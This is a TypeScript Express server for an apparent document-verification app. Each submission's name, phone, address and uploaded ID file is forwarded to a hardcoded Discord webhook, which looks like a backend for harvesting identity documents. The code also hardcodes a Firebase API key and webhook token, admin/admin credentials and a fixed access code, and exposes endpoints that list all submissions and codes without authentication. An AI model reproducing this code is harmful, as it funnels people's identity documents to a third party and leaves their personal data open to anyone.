import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import { initializeApp } from "firebase/app";
import { getFirestore, collection, doc, getDoc, getDocs, setDoc, deleteDoc } from "firebase/firestore";

const firebaseConfig = {
  projectId: "gen-lang-client-0865665135",
  appId: "1:713208023788:web:bc35066361c6ce161eb3c9",
  apiKey: "AIzaSyCwrjY9P_oGcGmx9sLQbndWLFvGxACG3UE",
  authDomain: "gen-lang-client-0865665135.firebaseapp.com",
};
const firebaseApp = initializeApp(firebaseConfig);
const firestoreDb = getFirestore(firebaseApp, "ai-studio-copyofverifydocp-7d18b517-7244-4648-81ee-c6e45db16399");

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "50mb" }));

// --- API Endpoints ---
app.post("/api/employee/login", async (req: any, res: any) => {
  try {
    const { accessCode } = req.body;
    const codeRef = doc(firestoreDb, 'accessCodes', accessCode);
    const codeSnap = await getDoc(codeRef);
    if (!codeSnap.exists()) {
      if (accessCode === '108026') {
        await setDoc(codeRef, { code: '108026', used: false, createdAt: new Date().toISOString() });
      } else {
        return res.status(400).json({ error: 'Invalid access code' });
      }
    }
    const finalSnap = await getDoc(codeRef);
    if (!finalSnap.exists() || finalSnap.data()?.used) {
      return res.status(400).json({ error: 'Invalid or already used access code' });
    }
    await deleteDoc(codeRef);
    const token = `token_emp_${accessCode}`;
    const user = { id: `emp_${accessCode}`, username: `Employee (${accessCode})`, role: "employee" };
    return res.json({ token, user });
  } catch (err: any) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
});

app.post("/api/admin/login", async (req: any, res: any) => {
  const { username, password } = req.body;
  if (username === 'admin' && password === 'admin') {
    const user = { id: 'admin-1', username: 'admin', role: 'admin' };
    return res.json({ token: 'token_admin', user });
  } else {
    return res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.post("/api/documents", async (req: any, res: any) => {
  try {
    const { docData, user } = req.body;
    const newDocId = `doc_${Date.now()}`;
    const { fileUrl, ...firestoreDocData } = docData;
    const newDoc = {
      id: newDocId,
      userId: user.id,
      username: user.username,
      status: 'pending',
      submittedAt: new Date().toISOString(),
      ipAddress: req.ip || req.socket.remoteAddress || 'Remote',
      ...firestoreDocData,
    };
    await setDoc(doc(firestoreDb, 'documents', newDocId), newDoc);

    const discordWebhookUrl = process.env.DISCORD_WEBHOOK_URL || "https://discord.com/api/webhooks/1527029251549692005/Eq-uDFflxj8qBScKHfpPFPPImPt2D-j7tz0ZUGI-dSc_ppcGWObQmWeJn5erZbBkgsgYK";
    if (discordWebhookUrl) {
      const message = `**New Document Submitted**\n**User:** ${user.username}\n**Name:** ${docData.fullName || 'N/A'}\n**Phone:** ${docData.phoneNumber || 'N/A'}\n**Address:** ${docData.streetAddress || 'N/A'}, ${docData.zipCode || 'N/A'}`;
      const form = new FormData();
      form.append("content", message);
      if (fileUrl) {
        const match = fileUrl.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
        if (match) {
          const mimeType = match[1];
          const buffer = Buffer.from(match[2], 'base64');
          const blob = new Blob([buffer], { type: mimeType });
          let extension = 'bin';
          if (mimeType.includes('png')) extension = 'png';
          else if (mimeType.includes('jpeg') || mimeType.includes('jpg')) extension = 'jpg';
          else if (mimeType.includes('pdf')) extension = 'pdf';
          form.append("file", blob, `document.${extension}`);
        }
      }
      fetch(discordWebhookUrl, { method: "POST", body: form as any }).catch(e => console.error(e));
    }

    return res.json({ success: true, docId: newDocId });
  } catch (err: any) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
});

app.get("/api/documents", async (req: any, res: any) => {
  try {
    const querySnapshot = await getDocs(collection(firestoreDb, 'documents'));
    const docs: any[] = [];
    querySnapshot.forEach((doc) => docs.push(doc.data()));
    docs.sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime());
    return res.json(docs);
  } catch (err: any) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
});

app.get("/api/codes", async (req: any, res: any) => {
  try {
    const querySnapshot = await getDocs(collection(firestoreDb, 'accessCodes'));
    let codeDocs: any[] = [];
    querySnapshot.forEach((doc) => codeDocs.push({ id: doc.id, ...doc.data() }));
    codeDocs.sort((a, b) => new Date(a.createdAt).getTime() - new Date(b.createdAt).getTime());
    let codes = codeDocs.map(c => c.id);
    if (codes.length === 0) {
      await setDoc(doc(firestoreDb, 'accessCodes', '108026'), { code: '108026', used: false, createdAt: new Date().toISOString() });
      codes.push('108026');
    }
    return res.json({ codes });
  } catch (err: any) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
});

app.post("/api/codes", async (req: any, res: any) => {
  try {
    const newCode = Math.floor(100000 + Math.random() * 900000).toString();
    await setDoc(doc(firestoreDb, 'accessCodes', newCode), { code: newCode, used: false, createdAt: new Date().toISOString() });
    return res.json({ code: newCode });
  } catch (err: any) {
    console.error(err);
    return res.status(500).json({ error: err.message });
  }
});


async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req: any, res: any) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://0.0.0.0:${PORT}`);
  });
}

startServer();
